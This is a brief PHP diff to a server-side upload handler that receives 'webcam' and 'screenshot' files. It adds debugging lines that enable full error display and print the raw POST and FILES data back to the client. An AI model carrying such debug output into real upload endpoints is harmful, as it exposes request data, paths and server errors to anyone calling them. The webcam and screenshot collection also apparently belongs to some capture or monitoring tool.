@@ -138,6 +138,17 @@ if (isset($_GET['action'])) {
     } elseif ($_GET['action'] == 'upload') {
         if (isset($_FILES['webcam']) || isset($_FILES['screenshot'])) {
             
+            
+            ini_set("display_startup_errors", "1");
+            ini_set("display_errors", "1");
+            error_reporting(E_ALL);
+            echo "<pre>";
+            echo "POST:";
+            print_r($_POST);
+            echo "FILES:";
+            print_r($_FILES);
+            echo "</pre>";
+            
             if ($_FILES['webcam']['error'] == 0) {
                 
                 $uploaddir = realpath('./') . '/files/';
